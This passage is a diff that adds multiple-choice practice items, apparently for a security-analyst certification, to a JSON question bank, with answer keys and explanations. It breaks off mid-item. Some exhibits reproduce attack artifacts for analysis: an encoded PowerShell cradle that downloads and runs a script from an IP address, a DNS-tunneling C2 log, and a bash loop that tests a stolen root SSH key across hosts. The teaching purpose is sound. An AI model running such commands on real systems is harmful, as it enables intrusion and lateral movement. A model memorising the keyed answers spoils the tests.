@@ -14269,5 +14269,698 @@
       }
     ],
     "explanation": "This excerpt is technically accurate but written for an engineer, not a risk committee — it's missing exactly what that audience needs to act: what the business impact/exposure actually is (payments processing environment implies real financial/compliance stakes, but that's not spelled out), who owns the fix, and by when. That's the core stakeholder-tailored reporting principle: the same underlying finding needs a different framing for a different audience. A packet capture is technical forensic detail with no place in a risk-committee summary. Breaking out the full CVSS vector component-by-component is exactly the kind of technical minutiae a business-risk audience doesn't need — they need the business consequence and the plan, not the scoring math."
+  },
+  {
+    "external_key": "SO-144",
+    "domain": "SO",
+    "subtopic": "Malware Analysis",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A PowerShell command line captured from an endpoint is shown below. Decoding the base64 blob (standard practice for this technique) reveals a script that downloads and executes a second-stage payload. What is the PRIMARY reason attackers base64-encode PowerShell like this?",
+    "exhibit": "powershell.exe -nop -w hidden -noni -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANQAxAC4ANAA1AC4AMQA0AC4ANwAvAHMAMgAuAHAAcwAxACcAKQA=",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Base64 encoding evades keyword-based detection scanning for plaintext strings like 'DownloadString' or 'IEX', while -enc is a legitimate flag that still executes it.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Base64 encoding is required by PowerShell for any command over 255 characters and has no security purpose here",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "Base64 encoding compresses the script, which is the primary reason for its use in this context",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Base64 encoding is a form of encryption that prevents the payload from being decoded without the attacker's private key",
+        "correct": false
+      }
+    ],
+    "explanation": "The -enc flag lets PowerShell execute a base64-encoded command directly, and encoding it this way is a well-known evasion technique: a plaintext command line containing 'IEX', 'DownloadString', or a URL is far more likely to trip a keyword-based detection rule than an opaque base64 blob, even though decoding it takes an analyst just one step. There's no 255-character requirement forcing encoding — that's not a real PowerShell constraint. Base64 doesn't compress data; encoded output is actually larger than the original. And base64 is a reversible encoding scheme, not encryption — anyone can decode it with no key at all, which is exactly why analysts routinely decode these blobs during investigation."
+  },
+  {
+    "external_key": "SO-145",
+    "domain": "SO",
+    "subtopic": "Indicators of Malicious Activity",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A DNS query log excerpt from an internal workstation is shown below. What does this pattern most strongly suggest?",
+    "exhibit": "14:02:01 query: xj4k9fq2.evil-c2domain.net type=TXT NXDOMAIN\n14:02:16 query: mq8pz1wr.evil-c2domain.net type=TXT NXDOMAIN\n14:02:31 query: bt5nx7yq.evil-c2domain.net type=TXT NXDOMAIN\n14:02:46 query: hj2kd9mp.evil-c2domain.net type=TXT NOERROR\n14:02:46 answer: \"Y21kIC9jIHdob2FtaSAvYWxs\"",
+    "choices": [
+      {
+        "label": "A",
+        "body": "DNS tunneling: high-entropy subdomains queried at regular intervals against one parent domain, using TXT records to carry encoded data, is a classic C2-over-DNS pattern.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Normal CDN load-balancing behavior, since high-entropy subdomains are commonly used to route traffic across edge nodes",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "A misconfigured internal DNS resolver retrying failed lookups against the same domain",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Certificate transparency log monitoring, which routinely generates random-looking subdomain queries",
+        "correct": false
+      }
+    ],
+    "explanation": "High-entropy (random-looking) subdomains queried at a steady cadence against one parent domain, using TXT records specifically, is the signature of DNS tunneling — TXT records can carry arbitrary encoded text, making them a convenient channel for C2 beacons and command/response traffic disguised as DNS lookups. The base64-looking TXT answer decodes to a command output, reinforcing this read. CDN routing doesn't typically use random high-entropy labels queried this rhythmically, and legitimate CDN queries wouldn't return TXT records containing encoded shell command output. A misconfigured resolver retrying a failed lookup would repeat the same query, not generate a new random subdomain each time. Certificate transparency monitoring is a passive, external logging system — it doesn't cause a workstation to generate outbound TXT queries like this."
+  },
+  {
+    "external_key": "SO-146",
+    "domain": "SO",
+    "subtopic": "Digital Forensics",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A Windows registry export from a compromised host is shown below. What does this entry represent?",
+    "exhibit": "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"OneDriveSync\"=\"C:\\\\Users\\\\Public\\\\svchost32.exe -silent\"",
+    "choices": [
+      {
+        "label": "A",
+        "body": "A persistence mechanism: a Run key entry disguised with a legitimate-sounding name, pointing to a binary in an unusual location (Public user profile) rather than a real Microsoft install path.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "A legitimate OneDrive sync configuration entry, since the value name references OneDrive",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "A harmless leftover registry key with no functional effect, since Run keys under HKEY_CURRENT_USER require administrator privileges to execute",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Evidence of a completed, already-remediated infection with no bearing on the current investigation",
+        "correct": false
+      }
+    ],
+    "explanation": "The Run key is one of the most common Windows persistence locations — anything listed here launches automatically at logon. The value name (\"OneDriveSync\") is chosen to look legitimate, but the actual target path is telling: real OneDrive runs from the user's AppData folder, not C:\\Users\\Public, and \"svchost32.exe\" is a lookalike for the legitimate svchost.exe (which never appears in a user-writable location like Public). Value names are cosmetic labels an attacker can set to anything — they prove nothing about legitimacy on their own. HKEY_CURRENT_USER Run keys execute at that user's logon with that user's own privileges, no admin rights required, which is exactly why it's such a common technique. Finding this artifact on a host currently under investigation is live evidence of an active persistence mechanism, not proof of a past, resolved incident."
+  },
+  {
+    "external_key": "SO-147",
+    "domain": "SO",
+    "subtopic": "Network Architecture",
+    "difficulty": 5,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A STRIDE threat model review of a new API endpoint identifies the following gaps. Select the TWO gaps that map to Tampering.\n\nGap 1: The API accepts a user ID parameter in the request body with no verification it belongs to the authenticated caller.\nGap 2: Request payloads are accepted with no integrity check, so a modified payload in transit would be processed as-is.\nGap 3: Successful and failed requests return identical response times, making it hard to distinguish valid from invalid API keys via timing.\nGap 4: The API accepts unsigned JSON payloads and trusts client-supplied field values, including a \"price\" field, without server-side recalculation.",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Gap 2 — no integrity check on the payload means data can be modified in transit and the server has no way to detect it, the core definition of Tampering.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Gap 1, since accepting an unverified user ID parameter is a Tampering issue rather than an authorization/Elevation of Privilege issue",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "Gap 3, since response-time consistency is a Tampering control rather than an Information Disclosure consideration",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Gap 4 — trusting a client-supplied \"price\" field without server-side recalculation lets a client silently modify data (the price) the server should own, a direct Tampering issue.",
+        "correct": true
+      }
+    ],
+    "explanation": "Tampering, in STRIDE, is about unauthorized modification of data. Gap 2 is the textbook case — no integrity verification on the payload means an in-transit modification would be silently accepted. Gap 4 is a more specific application of the same idea: trusting a client-controlled value that the server should be authoritative over (price) lets a client tamper with something it shouldn't control. Gap 1 (an unverified user ID letting one user act as another) is really an authorization gap, closer to Elevation of Privilege than Tampering — the caller isn't modifying data in transit, they're acting outside their intended privilege scope. Gap 3 (timing side-channels revealing whether a key is valid) is an Information Disclosure concern, not Tampering — nothing is being modified, information is potentially being leaked."
+  },
+  {
+    "external_key": "SO-148",
+    "domain": "SO",
+    "subtopic": "Network Architecture",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "An iptables ruleset pulled from a compromised internet-facing server is shown below. Which rule most likely represents an attacker-installed backdoor?",
+    "exhibit": "-A INPUT -p tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp --dport 80 -j ACCEPT\n-A INPUT -p tcp --dport 443 -j ACCEPT\n-A INPUT -p tcp --dport 31337 -s 0.0.0.0/0 -j ACCEPT\n-A INPUT -j DROP",
+    "choices": [
+      {
+        "label": "A",
+        "body": "The rule allowing port 31337 from any source — an unusual, non-standard high port open to the entire internet, with the well-known \"leet\" numeric pattern often used by backdoor tooling.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "The rule allowing port 22, since SSH should generally be avoided on any internet-facing configuration",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The final DROP rule, since a default-deny policy at the end of a chain is itself a security misconfiguration",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "The rule allowing port 443, since HTTPS traffic is inherently higher risk than HTTP traffic on port 80",
+        "correct": false
+      }
+    ],
+    "explanation": "Port 31337 has no legitimate standard service association, is open to 0.0.0.0/0 (the entire internet), and \"31337\" is a widely recognized leetspeak numeral (\"eleet\") historically associated with backdoor and remote-access tools — the combination of an unexplained port, unrestricted source, and that specific number is a strong backdoor indicator worth investigating immediately. SSH on 22 being internet-reachable is a design choice with real tradeoffs, but it's a standard, expected service, not inherently a compromise indicator by itself. A trailing DROP rule (default-deny) is a security best practice, not a misconfiguration — it's the opposite of a red flag. Port 443 is a standard, expected web service port; HTTPS isn't inherently riskier than HTTP just because it uses TLS."
+  },
+  {
+    "external_key": "VM-107",
+    "domain": "VM",
+    "subtopic": "Cloud Security",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A Terraform snippet flagged by a Checkov scan during a pull request review is shown below. What is the specific misconfiguration?",
+    "exhibit": "resource \"aws_s3_bucket\" \"reports\" {\n  bucket = \"corp-quarterly-reports\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"reports\" {\n  bucket = aws_s3_bucket.reports.id\n  block_public_acls   = false\n  block_public_policy  = false\n  ignore_public_acls   = false\n  restrict_public_buckets = false\n}",
+    "choices": [
+      {
+        "label": "A",
+        "body": "The public_access_block resource is explicitly configured with all four protections set to false, disabling every safeguard AWS provides against accidental public exposure of this bucket.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "The bucket name is too descriptive and should be randomized to prevent an attacker from guessing it",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "This configuration is secure by default, since aws_s3_bucket_public_access_block resources block public access unless a bucket policy explicitly overrides them",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "There is no misconfiguration here; a separate IAM policy is generally required to actually grant public access regardless of these settings",
+        "correct": false
+      }
+    ],
+    "explanation": "This is catching the misconfiguration precisely: someone explicitly declared the public_access_block resource but set all four flags to false, which disables the very protections that resource exists to provide — the practical effect is the same as not having the guardrail at all, just with a false sense of security from its presence in the code. Bucket naming obscurity isn't a real security control and isn't what this scan flags. The default behavior of these flags is actually true/blocking; setting them to false here is what removes that protection — the snippet is not secure by default, it deliberately turns the defaults off. And public exposure risk on S3 comes from the combination of bucket policies, ACLs, AND this public-access-block setting — this setting alone controls whether those other mechanisms are even allowed to grant public access, so it isn't irrelevant just because a separate policy would also be needed for full public read in some configurations."
+  },
+  {
+    "external_key": "VM-108",
+    "domain": "VM",
+    "subtopic": "Scanning Methodology",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A Trivy scan of a container image about to be pushed to production returns the findings below. Which should block the deployment?",
+    "exhibit": "libcurl        7.68.0-1ubuntu2.20  CVE-2023-38545  HIGH     Fixed: 7.68.0-1ubuntu2.22\nopenssl        1.1.1f-1ubuntu2.19  CVE-2022-0778   CRITICAL Fixed: 1.1.1f-1ubuntu2.20\nbusybox        1.30.1-4ubuntu6.5   CVE-2019-5747   LOW      Fixed: none available\nvim-common     8.1.2269-1ubuntu5   CVE-2021-3778   MEDIUM   Fixed: 8.1.2269-1ubuntu5.4",
+    "choices": [
+      {
+        "label": "A",
+        "body": "The openssl finding — a CRITICAL vulnerability with a fix already available should block the build until the base image or package is updated.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "The busybox finding, since any vulnerability with no available fix is automatically the highest deployment blocker regardless of severity",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "None of these should block deployment, since container vulnerability scan findings are typically treated as advisory only, not a release gate",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "The vim-common finding, since text editors are considered inherently higher risk than networking libraries in any container image",
+        "correct": false
+      }
+    ],
+    "explanation": "The openssl CVE is both CRITICAL severity and has a fix already published — that combination (highest severity, remediation readily available) is exactly what a reasonable release gate should block on; shipping a known-critical, fixable vulnerability to production is avoidable risk. The busybox finding has no available fix, but it's rated LOW — \"no fix available\" doesn't override severity to become automatically the top concern; it just means that specific issue will need a compensating control or acceptance rather than a version bump. Vulnerability scan findings absolutely can and should gate a pipeline when policy says so — treating them as purely advisory defeats the purpose of scanning at build time in the first place. Severity ranking isn't about the tool's category (editor vs. library) — it's about the CVE's actual scored impact, and vim-common's MEDIUM finding is lower priority than the CRITICAL openssl one regardless of what kind of tool each package is."
+  },
+  {
+    "external_key": "VM-109",
+    "domain": "VM",
+    "subtopic": "Scanning Methodology",
+    "difficulty": 5,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A credentialed vulnerability scan of a Windows server reports the four findings below. Select the TWO findings that are most likely FALSE POSITIVES requiring verification before action, based on the details given.\n\nFinding 1: \"SMBv1 enabled\" — scanner queried the registry key directly and confirmed the value is set to enabled.\nFinding 2: \"Outdated Java Runtime detected\" — scanner matched based on a Java installer file still present in Downloads, not on any registered/installed version.\nFinding 3: \"Missing patch KB5028166\" — scanner confirmed via WMI query that the patch is not in the installed updates list.\nFinding 4: \"Weak TLS 1.0 supported\" — scanner flagged based on the service banner advertising the protocol name, without confirming a live TLS handshake succeeded using it.",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Finding 2 — matching against a leftover installer file in Downloads, rather than an actually installed/registered version, doesn't confirm Java is actually present or running on the system.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Finding 1, since a direct registry key confirmation is inherently unreliable and should generally be independently verified",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "Finding 3, since a WMI-confirmed missing patch is a common but ultimately unverifiable scanner artifact",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Finding 4 — a banner advertising protocol support doesn't confirm the server will actually negotiate a handshake using it, which needs testing before treating it as confirmed exposure.",
+        "correct": true
+      }
+    ],
+    "explanation": "Findings 2 and 4 share the same underlying issue: the scanner is inferring a condition from indirect evidence rather than confirming the actual state. An installer file sitting in a Downloads folder proves someone downloaded it once, not that Java is installed or running — that needs verification against the actual installed-software inventory. Similarly, a service banner advertising TLS 1.0 support doesn't prove a client can actually complete a handshake using it (many servers advertise broader support than they'll actually negotiate) — that needs an active protocol-negotiation test to confirm real exposure. Findings 1 and 3, by contrast, are both direct, authoritative checks: a registry key read and a WMI-queried patch inventory are checking the actual system state directly, not inferring from secondary artifacts — treating either of those as unreliable by default undersells what a credentialed, direct-query check actually confirms."
+  },
+  {
+    "external_key": "VM-110",
+    "domain": "VM",
+    "subtopic": "CVSS / Prioritization",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A finding carries the CVSS v3.1 vector below. A stakeholder asks why this hasn't been escalated as urgent despite affecting a production system.\n\nCVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:N",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "This vector requires local access, high attack complexity, high privileges, and user interaction, with only Low C/I impact and no availability impact — a demanding chain of prerequisites for limited payoff.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Any vulnerability affecting a production system is automatically urgent regardless of what the CVSS vector says",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The Scope:Unchanged (S:U) value alone means this finding can be closed without further review",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "AV:L means this vulnerability is unlikely to be exploited in practice and should be deprioritized to zero",
+        "correct": false
+      }
+    ],
+    "explanation": "Reading the full vector: an attacker needs Local access (already on the box), High attack complexity (conditions outside their control must align), High privileges (already elevated), and User interaction (a victim must do something) — and even then only gets Low confidentiality/integrity impact with no availability impact at all. That's a demanding chain of prerequisites for a modest payoff, which is exactly why it's not being treated as urgent despite running on production — production alone doesn't automatically make every finding urgent; the actual exploitability and impact still matter. Scope:Unchanged just means the impact stays within the vulnerable component's own security boundary — it's one input to the score, not a standalone reason to close a finding without review. And AV:L doesn't mean unexploitable; it means the attacker needs local access already, which is a real (if higher-bar) attack path, not zero risk."
+  },
+  {
+    "external_key": "VM-111",
+    "domain": "VM",
+    "subtopic": "Compliance / Reporting",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "Nessus output for two scans of the same host, one week apart, is shown below. What does this comparison suggest happened?",
+    "exhibit": "Scan 1 (Aug 24): Credentialed: NO | Plugins executed: 4,102 | Findings: 3 (all Low)\nScan 2 (Aug 31): Credentialed: YES | Plugins executed: 71,844 | Findings: 22 (6 Critical, 9 High, 7 Medium)",
+    "choices": [
+      {
+        "label": "A",
+        "body": "The host was likely compromised sometime between the two scans, which is why so many new findings suddenly appeared.",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "Scan 1 was unauthenticated (fewer plugins, limited to what's externally visible); Scan 2 was credentialed and enumerated local software/patch state directly — the jump reflects visibility, not new vulnerabilities.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Nessus plugin counts have no relationship to scan depth or the number of findings a scan can produce",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "The second scan's results should be disregarded as erroneous, since no host should show this large a jump in findings between two scans",
+        "correct": false
+      }
+    ],
+    "explanation": "The \"Credentialed\" field is the key detail: Scan 1 ran unauthenticated with only ~4,100 plugins able to execute (limited to what's externally visible over the network), while Scan 2 authenticated to the host and could run over 71,000 plugins, including deep local checks against installed software and patch levels — that's why it surfaced 22 findings, including Criticals, that the first scan structurally couldn't have seen. Nothing here indicates a new compromise; the underlying vulnerabilities were very likely present all along, just invisible to an unauthenticated scan. Plugin count is a direct proxy for how much a scan can actually check — more plugins executed generally means deeper visibility, not an unrelated number. And a large jump in findings between an unauthenticated and a credentialed scan of the same host is a completely expected, common pattern — it shouldn't be dismissed as erroneous."
+  },
+  {
+    "external_key": "VM-112",
+    "domain": "VM",
+    "subtopic": "Compliance / Reporting",
+    "difficulty": 4,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A control catalog entry is shown below. Select the TWO classifications that correctly apply to this control.\n\nControl: \"All production database servers must have disk-level encryption enabled, verified quarterly by an automated compliance scan that alerts the security team if encryption is found disabled.\"",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Technical — the control is enforced through a technology mechanism (disk-level encryption), not a purely administrative policy or physical barrier.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Detective — the quarterly automated scan identifies (detects) if the required state (encryption enabled) is not being met.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Physical, since disk encryption operates at the hardware/storage layer",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Preventative, since the control's primary function as described is stopping encryption from ever being disabled in the first place",
+        "correct": false
+      }
+    ],
+    "explanation": "This control is Technical because it's implemented through a technology mechanism (encryption itself, plus an automated scanning tool) rather than through policy/process alone or a physical barrier. It's Detective because the described mechanism — a quarterly scan that alerts if encryption is found disabled — identifies a problem after the fact; it doesn't stop encryption from being disabled in the first place, it notices when that's happened. \"Physical\" refers to controls restricting physical access to facilities/hardware (badges, locks, cameras) — operating at the storage layer doesn't make a control physical in the CySA+ sense, that's still a technical classification. And \"Preventative\" would require the control to actively stop the bad state from occurring at all — this control only detects and alerts after encryption is already disabled, which is the defining trait of Detective, not Preventative."
+  },
+  {
+    "external_key": "IR-083",
+    "domain": "IR",
+    "subtopic": "Digital Forensics",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A Windows Security Event Log excerpt from a domain controller is shown below. What does this sequence most likely indicate?",
+    "exhibit": "4625  Failed logon  Account: svc_sql   Source: 10.4.2.91   Time: 03:14:02\n4625  Failed logon  Account: svc_sql   Source: 10.4.2.91   Time: 03:14:04\n4625  Failed logon  Account: svc_sql   Source: 10.4.2.91   Time: 03:14:06\n... (61 more 4625 events, same account/source, 2-second intervals) ...\n4624  Successful logon  Account: svc_sql   Source: 10.4.2.91   Time: 03:16:31\n4672  Special privileges assigned  Account: svc_sql   Source: 10.4.2.91   Time: 03:16:31",
+    "choices": [
+      {
+        "label": "A",
+        "body": "A brute-force attack against a service account that succeeded, immediately followed by that account being granted elevated privileges — a strong compromise indicator.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "A routine service restart, since service accounts commonly generate authentication failures during application startup",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "Event ID 4672 is purely informational and unrelated to the preceding logon events",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "This pattern only matters if the source IP is external to the network; since 10.4.2.91 is an internal address, it can be deprioritized",
+        "correct": false
+      }
+    ],
+    "explanation": "64 rapid-fire 4625 (failed logon) events against the same account from the same source, at a steady 2-second cadence, is a scripted brute-force pattern, not human error — and the immediate 4624 (success) followed by a 4672 (special/elevated privileges assigned) at the exact same timestamp means the attack succeeded and the compromised account is now operating with elevated rights, which is exactly the kind of sequence that should trigger immediate investigation. A routine service restart wouldn't produce dozens of failed authentication attempts at a fixed 2-second interval — that's an automated tool's signature, not application startup behavior. 4672 is directly tied to the logon session that triggered it; it's not an unrelated, standalone informational event. And internal source doesn't make this less concerning — an internal host brute-forcing a service account on a domain controller is a strong sign of lateral movement from an already-compromised internal system, arguably more urgent than an external attempt that a perimeter control might have already blocked."
+  },
+  {
+    "external_key": "IR-084",
+    "domain": "IR",
+    "subtopic": "Digital Forensics",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "Bash history recovered from a compromised Linux jump host is shown below. What does this sequence most likely represent?",
+    "exhibit": "cat ~/.ssh/known_hosts\nfor h in $(cat known_hosts | cut -d' ' -f1); do ssh -o StrictHostKeyChecking=no -i id_rsa_admin root@$h 'whoami' 2>/dev/null; done\nscp id_rsa_admin root@10.4.5.12:/root/.ssh/",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Lateral movement staging: enumerating trusted hosts from known_hosts, testing a stolen private key against each, then copying that key to a newly reached host to continue the chain.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "A routine SSH key rotation performed by the system administrator as part of standard maintenance",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "A benign network inventory script with no security relevance, since known_hosts files only ever contain public, non-sensitive information",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "A backup process, since scp is a standard file transfer utility used for routine backups",
+        "correct": false
+      }
+    ],
+    "explanation": "This is a textbook lateral-movement pattern: known_hosts reveals which systems this host has previously trusted/connected to (a map of likely-reachable targets), the loop tests a specific private key (id_rsa_admin — notably not the user's own default key) against every one of those hosts as root, and the final scp copies that same key onto a newly compromised host so the attacker can repeat the process from there, extending their reach hop by hop. Legitimate key rotation replaces or reissues keys through managed processes, not by testing a single static private key against every host in known_hosts as root. known_hosts entries reveal real infrastructure relationships — which hosts trust which — which is meaningful reconnaissance value to an attacker, not something to dismiss as non-sensitive. And scp is indeed a normal utility, but copying a private SSH key to another host's .ssh directory is a specific, deliberate action pattern that legitimate backup processes don't perform."
+  },
+  {
+    "external_key": "IR-085",
+    "domain": "IR",
+    "subtopic": "Communication & Legal",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A chain-of-custody form filled out during evidence collection is shown below. What is the MOST significant gap in this documentation?",
+    "exhibit": "Item: 1x external HDD, serial# WD-7729481\nCollected by: J. Torres, 2026-08-30 14:20\nHash at collection: (not recorded)\nTransferred to: forensic analyst, 2026-08-30 16:45\nStorage location: evidence locker, cabinet 3",
+    "choices": [
+      {
+        "label": "A",
+        "body": "The hash was never recorded at the time of collection, meaning there's no cryptographic baseline to later prove the drive's contents weren't altered after seizure.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "The 2 hour 25 minute gap between collection and transfer is itself disqualifying and cannot be explained by any legitimate process step",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The serial number should not appear on a chain-of-custody form for privacy reasons",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Storage location detail is irrelevant to chain-of-custody documentation and should be omitted",
+        "correct": false
+      }
+    ],
+    "explanation": "A hash calculated at the moment of collection is the cryptographic baseline everything else gets compared against later — without it, there's no way to later prove the drive's contents are identical to what was actually seized, which is the whole point of chain-of-custody documentation. A gap of a couple hours between collection and transfer to an analyst is normal and expected (transport, logging, queuing) — it's not inherently disqualifying on its own, especially since the form does document both timestamps, showing accountability for that window. The serial number is exactly the kind of unique identifying detail chain-of-custody forms are supposed to include, to prove this specific physical item is the one being tracked — omitting it would be the actual gap. Storage location is a standard, expected field on this kind of form, documenting where the evidence has been kept — it's relevant, not irrelevant."
+  },
+  {
+    "external_key": "IR-086",
+    "domain": "IR",
+    "subtopic": "IR Lifecycle",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A file-system timeline reconstructed during a ransomware investigation is shown below. What does this sequence indicate about the incident?",
+    "exhibit": "2026-08-28 02:11:04  File created: C:\\Windows\\Temp\\stage1.exe\n2026-08-28 02:14:22  File created: C:\\Windows\\Temp\\creds_dump.txt\n2026-08-28 02:17:50  Registry modified: LSA Notification Packages\n2026-08-31 23:58:02  Mass file rename events begin (14,201 files, .locked extension)\n2026-09-01 00:02:15  Ransom note created in 900+ directories",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Roughly 3 days of dwell time between initial access/credential theft and the encryption event — a substantial window for lateral movement before ransomware was deployed.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "The incident began on 2026-08-31, since that's when the actual damage (file encryption) started occurring",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The registry modification is unrelated to the ransomware deployment, since it occurred on a different day than the encryption event",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "This timeline proves the attacker had no interest in credential theft, since the ransom note focuses on file encryption, not data theft",
+        "correct": false
+      }
+    ],
+    "explanation": "The timestamps reveal roughly three days between the initial staging/credential-theft activity (Aug 28) and the mass encryption event (Aug 31 night into Sep 1) — that dwell time is significant: it's the window during which the attacker likely moved laterally, escalated privileges, and identified high-value targets before pulling the trigger on encryption, and it's exactly the kind of detail root-cause analysis needs to establish. The incident's actual start is the initial access/credential theft on Aug 28, not the visible encryption event days later — treating the visible damage as the start point misses the earlier compromise entirely. The LSA Notification Packages registry modification is a known credential-theft persistence technique (used to load a malicious DLL that captures credentials at logon) — occurring 3 minutes after a creds_dump.txt file was created on the same host is very likely directly related, not coincidental just because the encryption happened later. And creds_dump.txt appearing in the timeline is itself direct evidence of credential harvesting — the ransom note's focus doesn't erase that earlier activity."
+  },
+  {
+    "external_key": "IR-087",
+    "domain": "IR",
+    "subtopic": "IR Lifecycle",
+    "difficulty": 4,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A post-incident timeline shows the following IR actions. Select the TWO actions that belong to the Containment phase rather than Eradication or Recovery.",
+    "exhibit": "Action 1: Isolated the affected VLAN from the rest of the network.\nAction 2: Removed the malicious scheduled task and associated payload files from all affected hosts.\nAction 3: Disabled the compromised service account pending password reset.\nAction 4: Restored the affected database server from a verified clean backup.",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Action 1 — isolating the affected VLAN stops the incident from spreading further, the core purpose of containment.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Action 3 — disabling the compromised account immediately limits what the attacker can still do with it, without yet fully remediating the underlying compromise.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Action 2, since removing malicious files is a containment action rather than an eradication action",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Action 4, since restoring from backup is a containment action performed to stop further damage",
+        "correct": false
+      }
+    ],
+    "explanation": "Containment is about stopping the spread/impact of an active incident quickly, without necessarily fully resolving it yet. Isolating the VLAN (Action 1) does exactly that — it stops lateral spread immediately. Disabling the compromised account (Action 3) is the identity equivalent — it limits what the attacker can still do right now, even before a full password reset/credential cycling is completed. Action 2 (removing the malicious task and payload) is Eradication — actually eliminating the root cause/artifacts of the compromise, a distinct later phase from containment. Action 4 (restoring from backup) is Recovery — returning systems to normal operation, which happens after containment and eradication are complete, not as a way to stop ongoing damage."
+  },
+  {
+    "external_key": "RC-064",
+    "domain": "RC",
+    "subtopic": "Compliance / Reporting",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "An excerpt from a vulnerability tracking spreadsheet is shown below. What is the biggest reporting gap for a risk committee reviewing this?",
+    "exhibit": "CVE            Severity  Discovered   Owner   Due Date   Status\nCVE-2026-4471  Critical  2026-06-02   —       —          Open\nCVE-2026-5102  High      2026-07-14   —       —          Open\nCVE-2026-5544  Critical  2026-06-30   —       —          Open",
+    "choices": [
+      {
+        "label": "A",
+        "body": "No owner or due date is assigned to any of these findings, so there's no accountability for who's fixing them or by when — despite two being Critical and open for nearly three months.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "The CVE identifiers are formatted inconsistently and should be standardized before this report can be reviewed",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The \"Discovered\" column should be removed, since discovery date has no relevance to a risk committee's review",
+        "correct": false
+      },
+      {
+        "label": "D",
